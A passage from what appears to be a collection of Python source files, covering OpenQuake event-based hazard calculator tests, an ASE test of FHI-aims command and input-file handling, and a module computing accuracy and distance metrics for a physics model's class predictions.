openquake.calculators.views import view\nfrom openquake.calculators.export import export\nfrom openquake.calculators.extract import extract\nfrom openquake.calculators.event_based import get_mean_curves, compute_avg_gmf\nfrom openquake.calculators.tests import CalculatorTestCase\nfrom openquake.qa_tests_data.classical import case_18 as gmpe_tables\nfrom openquake.qa_tests_data.event_based import (\n    blocksize, case_1, case_2, case_3, case_4, case_5, case_6, case_7,\n    case_8, case_9, case_10, case_12, case_13, case_14, case_15, case_16,\n    case_17,  case_18, case_19, case_20, case_21, case_22, case_23, case_24,\n    case_25, case_26, case_27, case_28, mutex)\nfrom openquake.qa_tests_data.event_based.spatial_correlation import (\n    case_1 as sc1, case_2 as sc2, case_3 as sc3)\n\naac = numpy.testing.assert_allclose\n\n\ndef strip_calc_id(fname):\n    name = os.path.basename(fname)\n    return re.sub(r'_\\d+\\.', '.', name)\n\n\ndef joint_prob_of_occurrence(gmvs_site_1, gmvs_site_2, gmv, time_span,\n                             num_ses, delta_gmv=0.1):\n    \"\"\"\n    Compute the Poissonian probability of a ground shaking value to be in the\n    range [``gmv`` - ``delta_gmv`` / 2, ``gmv`` + ``delta_gmv`` / 2] at two\n    different locations within a given ``time_span``.\n\n    :param gmvs_site_1, gmvs_site_2:\n        Lists of ground motion values (as floats) for two different sites.\n    :param gmv:\n        Reference value for computing joint probability.\n    :param time_span:\n        `investigation_time` parameter from the calculation which produced\n        these ground motion values.\n    :param num_ses:\n        `ses_per_logic_tree_path` parameter from the calculation which produced\n        these ground motion values. In other words, the total number of\n        stochastic event sets.\n    :param delta_gmv:\n        the interval to consider\n    \"\"\"\n    assert len(gmvs_site_1) == len(gmvs_site_2)\n    half_delta = float(delta_gmv) / 2\n\n    def gmv_close(v):\n        return (gmv - half_delta <= v <= gmv + half_delta)\n    count = 0\n    for gmv_site_1, gmv_site_2 in zip(gmvs_site_1, gmvs_site_2):\n        if gmv_close(gmv_site_1) and gmv_close(gmv_site_2):\n            count += 1\n\n    prob = 1 - math.exp(- (float(count) / num_ses))\n    return prob\n\n\nclass EventBasedTestCase(CalculatorTestCase):\n\n    def check_avg_gmf(self):\n        # checking avg_gmf with a single site\n        min_iml = self.calc.oqparam.min_iml\n        df = self.calc.datastore.read_df('gmf_data', 'sid')\n        weights = self.calc.datastore['weights'][:]\n        rlzs = self.calc.datastore['events']['rlz_id']\n        [(sid, avgstd)] = compute_avg_gmf(df, weights[rlzs], min_iml).items()\n        avg_gmf = self.calc.datastore['avg_gmf'][:]  # 2, N, M\n        aac(avg_gmf[:, 0], avgstd)\n\n    def test_compute_avg_gmf(self):\n        numpy.random.seed(42)\n        E = 1000\n        eids = numpy.arange(E)\n        min_iml = numpy.array([.05])\n        gmvs = numpy.random.lognormal(mean=-2.0, sigma=.5, size=E)\n        ok = gmvs >= min_iml\n        self.assertEqual(ok.sum(), 983)\n        gmf_df = pandas.DataFrame(dict(eid=eids[ok], gmv_0=gmvs[ok]),\n                                  numpy.zeros(E, int)[ok])\n        weights = numpy.ones(E)\n        [(sid, avgstd)] = compute_avg_gmf(gmf_df, weights, min_iml).items()\n        # aac(avgstd, [[0.13664978], [1.63127694]]) without cutting min_iml\n        # aac(avgstd, [[0.14734], [1.475266]], atol=1E-6)  # cutting at .10\n        aac(avgstd, [[0.137023], [1.620616]], atol=1E-6)\n\n    def test_spatial_correlation(self):\n        expected = {sc1: [0.99, 0.41],\n                    sc2: [0.99, 0.64],\n                    sc3: [0.99, 0.22]}\n\n        for case in expected:\n            self.run_calc(case.__file__, 'job.ini')\n            oq = self.calc.oqparam\n            self.assertEqual(list(oq.imtls), ['PGA'])\n            dstore = read(self.calc.datastore.calc_id)\n            gmf = dstore.read_df('gmf_data', 'sid')\n            gmvs_site_0 = gmf.loc[0]['gmv_0']\n            gmvs_site_1 = gmf.loc[1]['gmv_0']\n            joint_prob_0_5 = joint_prob_of_occurrence(\n                gmvs_site_0, gmvs_site_1, 0.5, oq.investigation_time,\n                oq.ses_per_logic_tree_path)\n            joint_prob_1_0 = joint_prob_of_occurrence(\n                gmvs_site_0, gmvs_site_1, 1.0, oq.investigation_time,\n                oq.ses_per_logic_tree_path)\n\n            p05, p10 = expected[case]\n            aac(joint_prob_0_5, p05, atol=.1)\n            aac(joint_prob_1_0, p10, atol=.1)\n\n    def test_blocksize(self):\n        out = self.run_calc(blocksize.__file__, 'job.ini',\n                            concurrent_tasks='3', exports='csv')\n        [fname, _, sitefile] = out['gmf_data', 'csv']\n        self.assertEqualFiles('expected/gmf-data.csv', fname)\n        self.assertEqualFiles('expected/sites.csv', sitefile)\n\n        out = self.run_calc(blocksize.__file__, 'job.ini',\n                            concurrent_tasks='4', exports='csv')\n        [fname, sig_eps, _] = out['gmf_data', 'csv']\n        self.assertEqualFiles('expected/gmf-data.csv', fname)\n        self.assertEqualFiles('expected/sig-eps.csv', sig_eps)\n\n    def test_case_1(self):\n        out = self.run_calc(case_1.__file__, 'job.ini', exports='csv,xml')\n\n        etime = self.calc.datastore.get_attr('gmf_data', 'effective_time')\n        self.assertEqual(etime, 80000.)  # ses_per_logic_tree_path = 80000\n        imts = self.calc.datastore.get_attr('gmf_data', 'imts')\n        self.assertEqual(imts, 'PGA')\n        self.check_avg_gmf()\n\n        # make sure ses_id >= 65536 is valid\n        high_ses = (self.calc.datastore['events']['ses_id'] >= 65536).sum()\n        self.assertGreater(high_ses, 1000)\n\n        [fname] = export(('hcurves', 'csv'), self.calc.datastore)\n        self.assertEqualFiles(\n            'expected/hazard_curve-smltp_b1-gsimltp_b1.csv', fname)\n\n        export(('hcurves', 'xml'), self.calc.datastore)  # check it works\n\n        [fname] = out['hcurves', 'xml']\n        self.assertEqualFiles(\n            'expected/hazard_curve-smltp_b1-gsimltp_b1-PGA.xml', fname)\n\n        # compute hcurves in postprocessing and compare with inprocessing\n        # take advantage of the fact that there is a single site\n        df = self.calc.datastore.read_df('gmf_data', 'sid')\n        oq = self.calc.datastore['oqparam']\n        poes = gmvs_to_poes(df, oq.imtls, oq.ses_per_logic_tree_path)\n        hcurve = self.calc.datastore['hcurves-stats'][0, 0]  # shape (M, L)\n        aac(poes, hcurve)\n\n        # test gsim_by_imt\n        out = self.run_calc(case_1.__file__, 'job.ini',\n                            ses_per_logic_tree_path='30',\n                            gsim_logic_tree_file='gsim_by_imt_logic_tree.xml',\n                            exports='csv')\n\n        # testing event_info\n        einfo = dict(extract(self.calc.datastore, 'event_info/0'))\n        self.assertEqual(einfo['trt'], 'active shallow crust')\n        self.assertEqual(einfo['rupture_class'],\n                         'ParametricProbabilisticRupture')\n        self.assertEqual(einfo['surface_class'], 'PlanarSurface')\n        self.assertEqual(einfo['seed'], 1483155045)\n        self.assertEqual(str(einfo['gsim']),\n                         '[MultiGMPE.\"PGA\".AkkarBommer2010]\\n'\n                         '[MultiGMPE.\"SA(0.1)\".SadighEtAl1997]')\n        self.assertEqual(einfo['rlzi'], 0)\n        self.assertEqual(einfo['trt_smr'], 0)\n        aac(einfo['occurrence_rate'], 0.6)\n        aac(einfo['hypo'], [0., 0., 4.])\n\n        [fname, _, _] = out['gmf_data', 'csv']\n        self.assertEqualFiles('expected/gsim_by_imt.csv', fname)\n\n    def test_case_1_ruptures(self):\n        self.run_calc(case_1.__file__, 'job_ruptures.ini')\n        self.assertEqual(len(self.calc.datastore['ruptures']), 2)\n        [fname] = export(('events', 'csv'), self.calc.datastore)\n        self.assertEqualFiles('expected/events.csv', fname)\n\n    def test_minimum_intensity(self):\n        out = self.run_calc(case_2.__file__, 'job.ini', exports='csv',\n                            minimum_intensity='0.2')\n\n        [fname, _, _] = out['gmf_data', 'csv']\n        self.assertEqualFiles('expected/minimum-intensity-gmf-data.csv', fname)\n\n        # test gmf_data.hdf5 exporter\n        [fname] = export(('gmf_data', 'hdf5'), self.calc.datastore)\n        self.assertIn('gmf-data_', fname)\n\n    def test_case_2(self):\n        out = self.run_calc(case_2.__file__, 'job.ini', exports='csv')\n\n        [gmfs, sig_eps, _sitefile] = out['gmf_data', 'csv']\n        self.assertEqualFiles('expected/gmf-data.csv', gmfs)\n        # this is a case with truncation_level=0: sig-eps.csv must be empty\n        self.assertEqualFiles('expected/sig-eps.csv', sig_eps)\n\n        [fname] = out['hcurves', 'csv']\n        self.assertEqualFiles(\n            'expected/hazard_curve-smltp_b1-gsimltp_b1.csv', fname)\n\n    def test_case_2bis(self):  # oversampling\n        out = self.run_calc(case_2.__file__, 'job_2.ini', exports='csv,xml')\n        [fname, _, _] = out['gmf_data', 'csv']  # 2 realizations, 1 TRT\n        self.assertEqualFiles('expected/gmf-data-bis.csv', fname)\n        for fname in out['hcurves', 'csv']:\n            self.assertEqualFiles('expected/' + strip_calc_id(fname), fname,\n                                  delta=1E-6)\n\n    def test_case_3(self):  # 1 site, 1 rupture, 2 GSIMs, 10,000 years\n        self.run_calc(case_3.__file__, 'job.ini')\n        [f] = export(('avg_gmf', 'csv'), self.calc.datastore)\n        self.assertEqualFiles('expected/avg_gmf.csv', f)\n\n        [f] = export(('ruptures', 'csv'), self.calc.datastore)\n        self.assertEqualFiles('expected/ruptures.csv', f)\n\n        # check association events <-> GSIMs are 50-50 for full enum\n        rlzs = self.calc.datastore['full_lt'].get_realizations()\n        gsim = [rlz.gsim_rlz.value[0] for rlz in rlzs]\n        edf = self.calc.datastore.read_df('events', 'id')\n        edf['gsim'] = [gsim[r] for r in edf.rlz_id]\n        A, S = edf.groupby('gsim').rlz_id.count()\n        self.assertEqual(A, 5191)  # AkkarBommer2010 assocs\n        self.assertEqual(S, 4930)  # SadighEtAl1997 assocs\n\n        # check association events <-> GSIMs are 90-10 for sampling\n        self.run_calc(case_3.__file__, 'job.ini',\n                      number_of_logic_tree_samples=10000,\n                      ses_per_logic_tree_path=1)\n        rlzs = self.calc.datastore['full_lt'].get_realizations()\n        gsim = [rlz.gsim_rlz.value[0] for rlz in rlzs]\n        edf = self.calc.datastore.read_df('events', 'id')\n        edf['gsim'] = [gsim[r] for r in edf.rlz_id]\n        A, S = edf.groupby('gsim').rlz_id.count()\n        self.assertEqual(A, 9130)  # AkkarBommer2010 assocs\n        self.assertEqual(S, 991)   # SadighEtAl1997 assocs\n\n    def test_case_4(self):\n        out = self.run_calc(case_4.__file__, 'job.ini', exports='csv')\n        [fname] = out['hcurves', 'csv']\n        self.assertEqualFiles(\n            'expected/hazard_curve-smltp_b1-gsimltp_b1.csv', fname)\n\n        # exercise preclassical\n        self.run_calc(case_4.__file__, 'job.ini',\n                      calculation_mode='preclassical')\n\n    def test_case_5(self):\n        out = self.run_calc(case_5.__file__, 'job.ini', exports='csv')\n        [fname, _, _] = out['gmf_data', 'csv']\n        self.assertEqualFiles('expected/%s' % strip_calc_id(fname), fname,\n                              delta=1E-6)\n\n        [fname] = export(('ruptures', 'csv'), self.calc.datastore)\n        self.assertEqualFiles('expected/ruptures.csv', fname, delta=1E-6)\n\n        tmp = gettemp(extract(self.calc.datastore, 'ruptures').array)\n        self.assertEqualFiles('expected/ruptures_full.csv', tmp, delta=1E-6)\n\n        # check MFD\n        aw = extract(self.calc.datastore, 'event_based_mfd?')\n        aac(aw.mag, [4.6, 4.7, 4.9, 5.1, 5.3, 5.7], atol=1E-6)\n        aac(aw.freq, [0.004444, 0.004444, 0.006667, 0.002222,\n                      0.002222, 0.002222], atol=1E-4)\n\n    def test_case_6(self):\n        # 2 models x 3 GMPEs, different weights\n        expected = [\n            'hazard_curve-mean.csv',\n            'quantile_curve-0.1.csv',\n        ]\n        out = self.run_calc(case_6.__file__, 'job.ini', exports='csv')\n        fnames = out['hcurves', 'csv']\n        for exp, got in zip(expected, fnames):\n            self.assertEqualFiles('expected/%s' % exp, got)\n\n        [fname] = export(('realizations', 'csv'), self.calc.datastore)\n        self.assertEqualFiles('expected/realizations.csv', fname)\n\n        # comparing with the full calculation\n        # weights = [0.3 , 0.18, 0.12, 0.2 , 0.12, 0.08] for 6 realizations\n        self.check_avg_gmf()\n\n    def test_case_7(self):\n        # 2 models x 3 GMPEs, 1000 samples * 10 SES\n        expected = [\n            'hazard_curve-mean.csv',\n        ]\n        out = self.run_calc(case_7.__file__, 'job.ini', exports='csv')\n        aw = extract(self.calc.datastore, 'realizations')\n        dic = countby(aw.array, 'branch_path')\n        self.assertEqual({b'A~A': 308,  # w = .6 * .5 = .30\n                          b'A~B': 173,  # w = .6 * .3 = .18\n                          b'A~C': 119,  # w = .6 * .2 = .12\n                          b'B~A': 192,  # w = .4 * .5 = .20\n                          b'B~B': 127,  # w = .4 * .3 = .12\n                          b'B~C': 81},  # w = .4 * .2 = .08\n                         dic)\n\n        fnames = out['hcurves', 'csv']\n        mean_eb = get_mean_curves(self.calc.datastore, 'PGA')\n        for exp, got in zip(expected, fnames):\n            self.assertEqualFiles('expected/%s' % exp, got)\n        mean_cl = get_mean_curves(self.calc.cl.datastore, 'PGA')\n        reldiff, _index = max_rel_diff_index(\n            mean_cl, mean_eb, min_value=0.1)\n        self.assertLess(reldiff, 0.05)\n\n    def test_case_8(self):\n        out = self.run_calc(case_8.__file__, 'job.ini', exports='csv')\n        [fname] = out['ruptures', 'csv']\n        self.assertEqualFiles('expected/rup_data.csv', fname, delta=1E-4)\n\n    def test_case_9(self):\n        # example with correlation: the site collection must not be filtered\n        self.run_calc(case_9.__file__, 'job.ini', exports='csv')\n        # this is a case where there are 2 ruptures and 1 gmv per site\n        self.assertEqual(len(self.calc.datastore['gmf_data/eid']), 14)\n\n    def test_case_10(self):\n        # this is a case with multiple files in the smlt uncertaintyModel\n        # and with sampling\n        self.run_calc(case_10.__file__, 'job.ini')\n        [fname] = export(('realizations', 'csv'), self.calc.datastore)\n        self.assertEqualFiles('expected/realizations.csv', fname)\n\n    def test_case_12(self):\n        out = self.run_calc(case_12.__file__, 'job.ini', exports='csv')\n        [fname] = out['hcurves', 'csv']\n        self.assertEqualFiles(\n            'expected/hazard_curve-smltp_b1-gsimltp_b1_b2.csv', fname)\n\n    def test_case_13(self):\n        out = self.run_calc(case_13.__file__, 'job.ini', exports='csv')\n        [fname, _, _] = out['gmf_data', 'csv']\n        self.assertEqualFiles('expected/gmf-data.csv', fname)\n\n        [fname] = out['hcurves', 'csv']\n        self.assertEqualFiles(\n            'expected/hazard_curve-smltp_b1-gsimltp_b1.csv', fname)\n\n    def test_case_14(self):\n        # sampling of a logic tree of kind `is_source_specific`\n        out = self.run_calc(case_14.__file__, 'job.ini', exports='csv')\n        [fname, _, _] = out['gmf_data', 'csv']\n        self.assertEqualFiles('expected/gmf-data.csv', fname)\n\n    def test_case_15(self):\n        # an example for Japan testing also the XML rupture exporter\n        self.run_calc(case_15.__file__, 'job.ini')\n        [fname] = export(('ruptures', 'csv'), self.calc.datastore)\n        self.assertEqualFiles('expected/ruptures.csv', fname, delta=.004)\n\n    def test_case_16(self):\n        # an example with site model raising warnings and autogridded exposure\n        # and GMF amplification too\n        self.run_calc(case_16.__file__, 'job.ini')\n        hid = str(self.calc.datastore.calc_id)\n        self.run_calc(case_16.__file__, 'job.ini', hazard_calculation_id=hid)\n        tmp = gettemp(view('global_gmfs', self.calc.datastore))\n        self.assertEqualFiles('expected/global_gmfs.txt', tmp)\n\n    def test_case_17(self):  # oversampling\n        # also, grp-00 does not produce ruptures\n        expected = [\n            'hazard_curve-mean.csv',\n            'hazard_curve-rlz-001.csv',\n            'hazard_curve-rlz-002.csv',\n            'hazard_curve-rlz-003.csv',\n            'hazard_curve-rlz-004.csv',\n        ]\n        # test the --hc functionality, i.e. that ruptures are read correctly\n        out = self.run_calc(case_17.__file__, 'job.ini,job.ini', exports='csv')\n        fnames = out['hcurves', 'csv']\n        for exp, got in zip(expected, fnames):\n            self.assertEqualFiles('expected/%s' % exp, got)\n\n        # check that GMFs are not stored\n        with self.assertRaises(KeyError):\n            self.calc.datastore['gmf_data']\n\n    def test_case_18(self):  # oversampling, 3 realizations\n        out = self.run_calc(case_18.__file__, 'job.ini', exports='csv')\n        [fname, _, _] = out['gmf_data', 'csv']\n        self.assertEqualFiles('expected/%s' % strip_calc_id(fname), fname,\n                              delta=1E-6)\n\n    def test_case_19(self):  # test for Vancouver using the NRCan15SiteTerm\n        self.run_calc(case_19.__file__, 'job.ini')\n        [gmf, _, _] = export(('gmf_data', 'csv'), self.calc.datastore)\n        self.assertEqualFiles('expected/gmf-data.csv', gmf)\n\n        # a test with grid and site model\n        self.run_calc(case_19.__file__, 'job_grid.ini')\n        self.assertEqual(len(self.calc.datastore['ruptures']), 2)\n\n        # error for missing intensity_measure_types\n        with self.assertRaises(InvalidFile) as ctx:\n            self.run_calc(\n                case_19.__file__, 'job.ini',\n                hazard_calculation_id=str(self.calc.datastore.calc_id),\n                intensity_measure_types='')\n        self.assertIn('There are no intensity measure types in',\n                      str(ctx.exception))\n\n    def test_case_20(self):  # test for Vancouver using the NRCan15SiteTerm\n        self.run_calc(case_20.__file__, 'job.ini')\n        [gmf, _, _] = export(('gmf_data', 'csv'), self.calc.datastore)\n        self.assertEqualFiles('expected/gmf-data.csv', gmf)\n\n        # check the relevant_events\n        E = extract(self.calc.datastore, 'num_events')['num_events']\n        e = len(extract(self.calc.datastore, 'events'))\n        self.assertAlmostEqual(e/E, 0.2263374486)\n\n        # run again the GMF calculation, but this time from stored ruptures\n        hid = str(self.calc.datastore.calc_id)\n        self.run_calc(case_20.__file__, 'job.ini', hazard_calculation_id=hid)\n        [gmf, _, _] = export(('gmf_data', 'csv'), self.calc.datastore)\n        self.assertEqualFiles('expected/gmf-data-from-ruptures.csv', gmf)\n\n    def test_case_21(self):\n        self.run_calc(case_21.__file__, 'job.ini', exports='csv,xml')\n        self.run_calc(case_21.__file__, 'job.ini',\n                      ses_per_logic_tree_path='900',\n                      number_of_logic_tree_samples='0')\n\n    def test_case_22(self):\n        out = self.run_calc(case_22.__file__, 'job.ini', exports='csv')\n        [fname, _, _] = out['gmf_data', 'csv']\n        self.assertEqualFiles('expected/%s' % strip_calc_id(fname), fname,\n                              delta=1E-6)\n\n    def test_case_23(self):\n        # case with implicit grid and site model on a larger grid\n        out = self.run_calc(case_23.__file__, 'job.ini', exports='csv')\n        [fname] = out['ruptures', 'csv']\n        self.assertEqualFiles('expected/%s' % strip_calc_id(fname), fname,\n                              delta=1E-4)\n        sio = io.StringIO()\n        write_csv(sio, self.calc.datastore['sitecol'].array)\n        tmp = gettemp(sio.getvalue())\n        self.assertEqualFiles('expected/sitecol.csv', tmp)\n\n    def test_case_24(self):\n        # This is a test for shift_hypo = true - The expected results are the\n        # same ones defined for the case_44 of the classical methodology\n        self.run_calc(case_24.__file__, 'job.ini')\n        [fname] = export(('hcurves', 'csv'), self.calc.datastore)\n        self.assertEqualFiles('expected/hazard_curve-mean-PGA.csv', fname)\n\n    def test_case_25(self):\n        # logic tree common + extra\n        # common1.xml contains \"5\" \"6\"\n        # common2.xml contains \"1\" \"2\"\n        # extra1.xml contains \"3\"\n        # extra2.xml contains \"4\"\n        # extra3.xml contains \"7\"\n        self.run_calc(case_25.__file__, 'job.ini')\n        mean, *others = export(('hcurves', 'csv'), self.calc.datastore)\n        self.assertEqualFiles('expected/hazard_curve-PGA.csv', mean)\n\n        self.run_calc(case_25.__file__, 'job2.ini')\n        mean, *others = export(('hcurves', 'csv'), self.calc.datastore)\n        self.assertEqualFiles('expected/hazard_curve-PGA.csv', mean)\n\n        # test with common1.xml present into branchs and sampling\n        self.run_calc(case_25.__file__, 'job_common.ini')\n        mean, *others = export(('ruptures', 'csv'), self.calc.datastore)\n        self.assertEqualFiles('expected/ruptures.csv', mean)\n\n    def test_case_26_land(self):\n        # cali landslide simplified\n        self.run_calc(case_26.__file__, 'job_land.ini')\n        df = self.calc.datastore.read_df('gmf_data', 'sid')\n        pd_mean = df[df.DispProb > 0].DispProb.mean()\n        nd_mean = df[df.Disp > 0].Disp.mean()\n        self.assertGreater(pd_mean, 0)\n        self.assertGreater(nd_mean, 0)\n        [fname, _, _] = export(('gmf_data', 'csv'), self.calc.datastore)\n        arr = read_csv(fname)[:2]\n        self.assertEqual(arr.dtype.names,\n                         ('site_id', 'event_id', 'gmv_PGA',\n                          'sep_Disp', 'sep_DispProb'))\n\n    def test_case_26_liq(self):\n        # cali liquefaction simplified\n        self.run_calc(case_26.__file__, 'job_liq.ini')\n        [fname] = export(('avg_gmf', 'csv'), self.calc.datastore)\n        self.assertEqualFiles('avg_gmf.csv', fname)\n\n    def test_case_27(self):\n        # splitting ruptures + gmf1 + gmf2\n        self.run_calc(case_27.__file__, 'job.ini',\n                      ground_motion_fields=\"false\")\n        self.assertEqual(len(self.calc.datastore['ruptures']), 15)\n        hc_id = str(self.calc.datastore.calc_id)\n\n        self.run_calc(case_27.__file__, 'job.ini', sites_slice=\"0:41\",\n                      hazard_calculation_id=hc_id)\n        [fname] = export(('avg_gmf', 'csv'), self.calc.datastore)\n        self.assertEqualFiles('expected/avg_gmf1.csv', fname)\n\n        self.run_calc(case_27.__file__, 'job.ini', sites_slice=\"41:82\",\n                      hazard_calculation_id=hc_id)\n        [fname] = export(('avg_gmf', 'csv'), self.calc.datastore)\n        self.assertEqualFiles('expected/avg_gmf2.csv', fname)\n\n    def test_case_28(self):\n        out = self.run_calc(case_28.__file__, 'job.ini', exports='csv')\n        [fname, _, _] = out['gmf_data', 'csv']\n        self.assertEqualFiles('expected/%s' % strip_calc_id(fname), fname,\n                              delta=1E-6)\n\n    def test_overflow(self):\n        too_many_imts = {'SA(%s)' % period: [0.1, 0.2, 0.3]\n                         for period in numpy.arange(0.1,  1, 0.001)}\n        with self.assertRaises(ValueError) as ctx:\n            self.run_calc(\n                case_2.__file__, 'job.ini',\n                intensity_measure_types_and_levels=str(too_many_imts))\n        self.assertEqual(str(ctx.exception),\n                         'The event_based calculator is restricted '\n                         'to 256 imts, got 900')\n\n    def test_mutex(self):\n        out = self.run_calc(mutex.__file__, 'job.ini', exports='csv,xml')\n        [fname] = out['ruptures', 'csv']\n        self.assertEqualFiles('expected/ruptures.csv', fname, delta=1E-6)\n\n    def test_gmpe_tables(self):\n        out = self.run_calc(\n            gmpe_tables.__file__, 'job.ini',\n            calculation_mode='event_based',\n            investigation_time='100',\n            exports='csv')\n        [fname, _, _] = out['gmf_data', 'csv']\n        self.assertEqualFiles('expected/gmf.csv', fname, delta=1E-6)\n", "335": "def test_aims_interface():\n    import tempfile\n    import os\n\n    from ase.calculators.aims import Aims\n    from ase import Atoms\n\n    # test the new command handling + legacy behavior\n    aims_command = 'aims.x'\n    aims_command_alternative = 'mpirun -np 4 fhiaims.x'\n    outfilename = 'alternative_aims.out'\n    outfilename_default = 'aims.out'\n    command = '{0:s} > {1:s}'.format(aims_command, outfilename)\n    #command_alternative = '{0:s} > {1:s}'.format(aims_command_alternative, outfilename)\n    command_default = '{0:s} > {1:s}'.format(aims_command, outfilename_default)\n    legacy_command = 'aims.version.serial.x > aims.out'\n    legacy_aims_command = legacy_command.split('>')[0].strip()\n    legacy_outfilename = legacy_command.split('>')[-1].strip()\n\n    # legacy behavior of empty init\n    calc = Aims()\n    assert calc.command == legacy_command\n    assert calc.outfilename == legacy_outfilename\n    assert calc.aims_command == legacy_aims_command\n\n    # behavior of empty init with env variable\n    os.environ['ASE_AIMS_COMMAND'] = aims_command_alternative\n    calc = Aims()\n    assert calc.command == '{0} > {1}'.format(aims_command_alternative, outfilename_default)\n    assert calc.outfilename == outfilename_default\n    assert calc.aims_command == aims_command_alternative\n\n    # legacy behavior of \"proper\" command\n    calc = Aims(run_command=command)\n    assert calc.command == command\n    assert calc.outfilename == outfilename\n    assert calc.aims_command == aims_command\n\n    # legacy behavior of an \"improper\" command\n    calc = Aims(run_command=aims_command)\n    assert calc.command == command_default\n    assert calc.aims_command == aims_command\n    assert calc.outfilename == outfilename_default\n\n    # fixed \"command\"  behavior\n    calc = Aims(command=command)\n    assert calc.command == command\n    assert calc.outfilename == outfilename\n    assert calc.aims_command == aims_command\n\n    # novel way to use aims_command, no specific outfile\n    calc = Aims(aims_command=aims_command)\n    assert calc.command == command_default\n    assert calc.outfilename == outfilename_default\n    assert calc.aims_command == aims_command\n\n    calc = Aims(aims_command=aims_command,\n                outfilename=outfilename)\n    assert calc.command == command\n    assert calc.outfilename == outfilename\n    assert calc.aims_command == aims_command\n\n    # # testing the setters\n    calc.command = command_default\n    assert calc.outfilename == outfilename_default\n    assert calc.aims_command == aims_command\n    assert calc.command == command_default\n\n    #calc.set_aims_command(aims_command_alternative)\n    calc.aims_command = aims_command_alternative\n    assert calc.aims_command == aims_command_alternative\n    assert calc.outfilename == outfilename_default\n    assert calc.command == '{} > {}'.format(aims_command_alternative, outfilename_default)\n\n    calc.outfilename = outfilename\n    assert calc.command == '{} > {}'.format(aims_command_alternative, outfilename)\n    assert calc.aims_command == aims_command_alternative\n    assert calc.outfilename == outfilename\n\n\n    # test writing files\n    tmp_dir = tempfile.mkdtemp()\n    water = Atoms('HOH', [(1, 0, 0), (0, 0, 0), (0, 1, 0)])\n    calc = Aims(xc='PBE',\n                output=['dipole'],\n                sc_accuracy_etot=1e-6,\n                sc_accuracy_eev=1e-3,\n                sc_accuracy_rho=1e-6,\n                species_dir=\"/data/rittmeyer/FHIaims/species_defaults/light/\",\n                sc_accuracy_forces=1e-4,\n                label=tmp_dir,\n                )\n    try:\n        calc.prepare_input_files()\n        raise AssertionError\n    except ValueError:\n        pass\n\n    calc.atoms = water\n    calc.prepare_input_files()\n    for f in ['control.in', 'geometry.in']:\n        assert os.path.isfile(os.path.join(tmp_dir,f))\n", "336": "import numpy as np\nimport os\n\nfrom scipy import stats\n\nfrom sklearn.metrics import roc_auc_score\n\nfrom src_py.metrics_utils import calculate_deltas_unsigned, calculate_deltas_signed\n\n\ndef weight_fun(x, a, b, c):\n    return a + b * np.cos(x) + c * np.sin(x)\n\ndef calc_weights(num_classes, coeffs):\n    k2PI = 2* np.pi\n    x = np.linspace(0, k2PI, num_classes)\n    data_len = coeffs.shape[0]\n    weights = np.zeros((data_len, num_classes))\n    for i in range(data_len):\n        weights[i] = weight_fun(x, *coeffs[i])\n    return weights\n\ndef calc_argmaxs_distances(pred_arg_maxs, calc_arg_maxs, num_class):\n    return calculate_deltas_signed(calc_arg_maxs, pred_arg_maxs, num_class)\n\n\ndef calculate_metrics_from_file(directory, num_classes):\n    calc_w = np.load(os.path.join(directory, 'softmax_calc_w.npy'))\n    preds_w = np.load(os.path.join(directory, 'softmax_preds_w.npy'))\n    return calculate_metrics(calc_w, preds_w, num_classes)\n\n\ndef calculate_metrics(calc_w, preds_w, num_classes):\n    pred_arg_maxs = np.argmax(preds_w, axis=1)\n    calc_arg_maxs = np.argmax(calc_w, axis=1)\n\n    k2PI = 2 * np.pi\n    calc_pred_argmaxs_abs_distances = calculate_deltas_unsigned( pred_arg_maxs, calc_arg_maxs, num_classes)\n    calc_pred_argmaxs_signed_distances = calculate_deltas_signed(pred_arg_maxs, calc_arg_maxs, num_classes)\n    calc_pred_argmaxs_abs_distances_rad = calc_pred_argmaxs_abs_distances * k2PI/(1.0*num_classes)\n    \n    mean_deltas = np.mean(calc_pred_argmaxs_signed_distances, dtype=np.float64)\n    mean_deltas_err = stats.sem(calc_pred_argmaxs_signed_distances)\n    mean_deltas_rad = mean_deltas * k2PI/(1.0*num_classes)\n    mean_deltas_err_rad = mean_deltas_err * k2PI/(1.0*num_classes)\n\n    acc0 = (calc_pred_argmaxs_abs_distances <= 0).mean()\n    acc1 = (calc_pred_argmaxs_abs_distances <= 1).mean()\n    acc2 = (calc_pred_argmaxs_abs_distances <= 2).mean()\n    acc3 = (calc_pred_argmaxs_abs_distances <= 3).mean()\n\n    acc0_rad = (calc_pred_argmaxs_abs_distances_rad <= 0.25).mean()\n    acc1_rad = (calc_pred_argmaxs_abs_distances_rad <= 0.50).mean()\n    acc2_rad = (calc_pred_argmaxs_abs_distances_rad <= 0.75).mean()\n    acc3_rad = (calc_pred_argmaxs_abs_distances_rad <= 1.00).mean()\n\n    l1_delta_w = np.mean(np.abs(calc_w - preds_w), dtype=np.float64)\n    l2_delta_w = np.sqrt(np.mean((calc_w - preds_w)**2), dtype=np.float64)\n    # problem with format, should not be array\n    l2_delta_w_err = stats.sem((calc_w - preds_w)**2)\n\n    # calc_w, preds_w normalisation to probability\n    calc_w_norm = calc_w / np.sum(calc_w, axis=1)[:, np.newaxis]\n    preds_w_norm = preds_w / np.sum(preds_w, axis=1)[:, np.newaxis]\n \n    l1_delta_w_norm = np.mean(np.abs(calc_w_norm - preds_w_norm), dtype=np.float64)\n    l2_delta_w_norm = np.sqrt(np.mean((calc_w_norm - preds_w_norm)**2), dtype=np.float64)\n    # problem with format, should not be array\n    l2_delta_w_norm_err = stats.sem((calc_w_norm - preds_w_norm)**2)\n  \n    \n    return np.array([acc0, acc1, acc2, acc3, mean_deltas, l1_delta_w, l2_delta_w, mean_deltas_rad, acc0_rad, acc1_rad, acc2_rad, acc3_rad,l1_delta_w_norm, l2_delta_w_norm, mean_deltas_err, mean_deltas_err_rad, l2_delta_w_err, l2_delta_w_norm_err ]) \n\n\ndef calculate_metrics_regr_c012s_from_file(directory, num_classes):\n    calc_c012s = np.load(os.path.join(directory,'test_regr_calc_c012s.npy'))\n    pred_c012s = np.load(os.path.join(directory,'test_regr_preds_c012s.npy'))\n\n    return calculate_metrics_regr_c012s(calc_c012s, pred_c012s, num_classes)\n\n\ndef calculate_metrics_regr_c012s(calc_c012s, pred_c012s, num_classes):\n    calc_w  = calc_weights(num_classes, calc_c012s)\n    preds_w = calc_weights(num_classes, pred_c012s)\n\n    return calculate_metrics(calc_w, preds_w, num_classes)\n\n\ndef get_filename_for_class(pathIN, class_num, subset=None):\n    d = '../monit_npy/nn_rhorho_Variant-All_Unweighted_False_NO_NUM_CLASSES_{class_num}'\n    if subset:\n        d 